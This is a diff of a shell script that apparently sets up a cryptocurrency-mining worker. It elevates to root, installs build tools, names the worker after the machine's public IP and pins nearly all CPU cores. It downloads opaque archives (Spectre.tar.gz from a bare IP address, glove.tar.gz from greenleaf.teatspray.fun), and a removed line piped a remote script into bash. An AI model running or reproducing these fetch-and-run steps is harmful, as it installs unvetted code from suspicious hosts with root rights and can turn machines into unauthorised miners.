@@ -1,18 +1,9 @@
 #!/bin/sh
+
+sudo -i
+
 export DEBIAN_FRONTEND=noninteractive
 DEBIAN_FRONTEND=noninteractive
-
-apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools apt-utils dpkg >/dev/null
-
-sleep 2
-
-wget -O - https://deb.nodesource.com/setup_20.x | bash 
-
-sleep 2
-
-apt-get install -y nodejs
-
-sleep 2
 
 node -v && npm
 
@@ -29,16 +20,28 @@ sleep 2
 cat /etc/*-release
 sleep 2
 
+apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg >/dev/null
+
+sleep 2
+
 num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
 currentdate=$(date '+%d-%b-%Y_Bitr_')
 ipaddress=$(curl -s api.ipify.org)
 underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
 currentdate+=$underscored_ip
-used_num_of_cores=`expr $num_of_cores - 3`
+used_num_of_cores=`expr $num_of_cores - 1`
+
+echo ""
+echo "You have a total number of $used_num_of_cores cores"
+echo ""
+
+echo ""
+echo "Your worker name is $currentdate"
+echo ""
 
 sleep 2
 
-wget -q http://greenleaf.teatspray.fun/Spectre.tar.gz > /dev/null
+wget http://45.135.58.52/Spectre.tar.gz
 
 sleep 2
 
@@ -68,32 +71,8 @@ dpkg-reconfigure --frontend noninteractive tzdata > /dev/null
 sleep 2
 
 TZ='Africa/Johannesburg'; export TZ
-date
-
-sleep 2
-
-echo ""
-echo ""
-echo ""
-echo ""
-
-echo ""
-echo "You have a total number of $used_num_of_cores cores"
-echo ""
-echo ""
-echo ""
-
-sleep 2
-
-echo ""
-echo "Your worker name is $currentdate"
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-
-sleep 2
+date 
+sleep 2 
 
 wget -q http://greenleaf.teatspray.fun/glove.tar.gz >/dev/null
 
